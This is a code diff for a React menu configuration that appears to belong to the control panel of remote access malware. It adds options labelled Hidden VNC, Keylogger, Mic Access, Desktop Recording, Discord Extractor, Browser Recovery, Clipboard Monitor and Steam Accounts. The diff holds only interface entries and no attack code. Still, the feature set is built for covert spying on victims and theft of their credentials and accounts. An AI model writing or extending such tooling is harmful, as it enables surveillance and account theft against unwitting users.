@@ -38,6 +38,14 @@ import {
   IconLink,
   IconUser,
   IconMessageCog,
+  IconKeyboard,
+  IconBrowser,
+  IconMicrophone,
+  IconDeviceDesktop,
+  IconBrandDiscord,
+  IconApps,
+  IconClipboard,
+  IconSteam,
 } from "@tabler/icons-react";
 
 const menuOptions = [
@@ -52,9 +60,69 @@ const menuOptions = [
     icon: <IconSettings2 size={24} />,
     options: [
       {
+        label: "Hidden VNC",
+        type: "hvnc",
+        icon: <IconDeviceDesktopCog size={24} />,
+        optionType: OptionType.WINDOW,
+      },
+      {
         label: "Remote Desktop",
         type: "remote-desktop",
         icon: <IconShareplay size={24} />,
+        optionType: OptionType.WINDOW,
+      },
+      {
+        label: "Mic Access",
+        type: "mic-access",
+        icon: <IconMicrophone size={24} />,
+        optionType: OptionType.WINDOW,
+      },
+      {
+        label: "Desktop Recording",
+        type: "desktop-recording",
+        icon: <IconDeviceDesktop size={24} />,
+        optionType: OptionType.WINDOW,
+      },
+      {
+        label: "Discord Extractor",
+        type: "discord-extractor",
+        icon: <IconBrandDiscord size={24} />,
+        optionType: OptionType.WINDOW,
+      },
+      {
+        label: "Keylogger",
+        type: "keylogger",
+        icon: <IconKeyboard size={24} />,
+        optionType: OptionType.WINDOW,
+      },
+          {
+        label: "Browser Recovery",
+        type: "browser-data",
+        icon: <IconBrowser size={24} />,
+        optionType: OptionType.WINDOW,
+      },
+      {
+        label: "Data Collector",
+        type: "data-collector",
+        icon: <IconApps size={24} />,
+        optionType: OptionType.WINDOW,
+      },
+      {
+        label: "Clipboard Monitor",
+        type: "clipboard",
+        icon: <IconClipboard size={24} />,
+        optionType: OptionType.WINDOW,
+      },
+      {
+        label: "Software Manager",
+        type: "software",
+        icon: <IconApps size={24} />,
+        optionType: OptionType.WINDOW,
+      },
+      {
+        label: "Steam Accounts",
+        type: "steam-account",
+        icon: <IconSteam size={24} />,
         optionType: OptionType.WINDOW,
       },
       {
